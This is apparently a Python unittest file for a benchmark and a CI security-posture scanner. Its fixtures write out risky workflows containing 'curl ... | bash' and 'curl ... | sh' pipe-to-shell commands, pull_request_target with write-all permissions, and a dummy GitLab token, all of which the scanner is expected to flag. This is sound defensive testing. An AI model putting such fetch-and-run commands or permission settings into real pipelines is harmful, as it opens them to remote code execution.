import json
import tempfile
import unittest
from pathlib import Path

from scripts.benchmark_harmony import benchmark
from scripts.security_posture import automation_findings, secret_findings


class EngineeringHealthTests(unittest.TestCase):
    def test_harmony_benchmark_is_deterministic(self):
        result = benchmark(count=36, budget=24, iterations=2)
        self.assertTrue(result["deterministic"])
        self.assertEqual(len(result["selection_hash"]), 64)
        self.assertGreater(result["selected_count"], 0)
        self.assertLessEqual(result["total_cost"], 24)
        self.assertGreaterEqual(result["coverage_score"], 0.0)
        self.assertLessEqual(result["coverage_score"], 1.0)
        self.assertGreaterEqual(result["content_score"], 0.0)
        self.assertLessEqual(result["content_score"], 1.0)

    def test_security_posture_detects_high_risk_workflow_patterns(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / "bad.yml").write_text(
                "on:\n"
                "  pull_request_target:\n"
                "permissions: write-all\n"
                "jobs:\n"
                "  bad:\n"
                "    steps:\n"
                "      - run: curl https://example.invalid/x | bash\n",
                encoding="utf-8",
            )
            kinds = {item["kind"] for item in automation_findings(root)}
            self.assertIn("pull_request_target", kinds)
            self.assertIn("write_all", kinds)
            self.assertIn("pipe_to_shell", kinds)

    def test_security_posture_accepts_explicit_read_only_workflow(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / "good.yml").write_text(
                "name: CI\n"
                "on: [push]\n"
                "permissions:\n"
                "  contents: read\n"
                "jobs:\n"
                "  test:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: python -m unittest\n",
                encoding="utf-8",
            )
            high = [
                item
                for item in automation_findings(root)
                if item["severity"] in {"critical", "high"}
            ]
            self.assertEqual(high, [])

    def test_secret_scan_ignores_docs_but_flags_production_source(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "docs").mkdir()
            (root / "docs" / "example.md").write_text(
                "glpat-abcdefghijklmnopqrstuvwxyz123456",
                encoding="utf-8",
            )
            (root / "config.json").write_text(
                json.dumps(
                    {"token": "glpat-abcdefghijklmnopqrstuvwxyz123456"}
                ),
                encoding="utf-8",
            )
            findings = secret_findings(root)
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0]["path"], str(root / "config.json"))

    def test_gitlab_ci_is_scanned_for_pipe_to_shell(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / ".gitlab-ci.yml").write_text(
                "job:\n"
                "  script:\n"
                "    - curl https://example.invalid/x | sh\n",
                encoding="utf-8",
            )
            kinds = {item["kind"] for item in automation_findings(root)}
            self.assertIn("pipe_to_shell", kinds)


if __name__ == "__main__":
    unittest.main()
